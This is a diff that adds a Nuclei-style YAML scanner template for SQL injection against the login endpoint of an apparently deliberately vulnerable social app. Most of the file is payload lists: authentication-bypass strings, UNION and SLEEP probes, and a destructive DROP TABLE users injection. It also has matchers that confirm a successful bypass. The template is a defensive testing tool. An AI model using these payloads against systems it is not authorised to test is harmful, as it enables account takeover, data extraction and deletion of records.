@@ -1,0 +1,111 @@
+id: vuln-sns-login-sql-injection
+info:
+  name: Vuln SNS Login - SQL Injection
+  author: claude
+  severity: critical
+  description: |
+    Tests for SQL injection vulnerabilities in the login endpoint.
+    Successful exploitation could lead to authentication bypass,
+    data extraction, or database manipulation.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: vuln-sns,sqli,login,critical
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"user_id":"{{injection}}","password":"test123"}
+
+    payloads:
+      injection:
+        - "' OR '1'='1"
+        - "' OR '1'='1' --"
+        - "' OR '1'='1' #"
+        - "admin' --"
+        - "admin' #"
+        - "' OR 1=1 --"
+        - "' OR 1=1 #"
+        - "') OR ('1'='1"
+        - "') OR ('1'='1' --"
+        - "' UNION SELECT null,null,null --"
+        - "' AND SLEEP(5) --"
+        - "'; DROP TABLE users; --"
+        - "' OR EXISTS(SELECT * FROM users) --"
+        - "\\'OR\\'1\\'=\\'1"
+        - "alice' AND '1'='2"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - '"token":'
+          - '"user":'
+        condition: and
+        part: body
+
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql error"
+          - "syntax error"
+          - "database error"
+          - "MySQLSyntaxErrorException"
+        condition: or
+        part: body
+
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
+
+      - type: status
+        status:
+          - 500
+
+    extractors:
+      - type: regex
+        name: sql_error
+        regex:
+          - 'SQL.*error.*'
+          - 'mysql.*error.*'
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"user_id":"test","password":"{{injection}}"}
+
+    payloads:
+      injection:
+        - "' OR '1'='1"
+        - "' OR '1'='1' --"
+        - "password' OR '1'='1"
+        - "' UNION SELECT null --"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - '"token":'
+          - '"user":'
+        condition: and
+        part: body
+
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql error"
+        condition: or
+        part: body
